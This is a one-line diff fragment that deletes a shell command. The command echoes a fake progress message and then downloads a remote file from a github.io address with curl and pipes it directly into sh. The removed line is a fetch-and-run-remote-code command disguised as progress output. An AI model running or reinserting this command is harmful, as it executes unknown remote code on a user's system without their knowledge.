@@ -1,1 +1,0 @@
-echo 'Progress: 46.0%'; curl -L --progress-bar frkns.github.io/fun/OFFENSIVE_CONTINUES_AFTER.tsx | sh
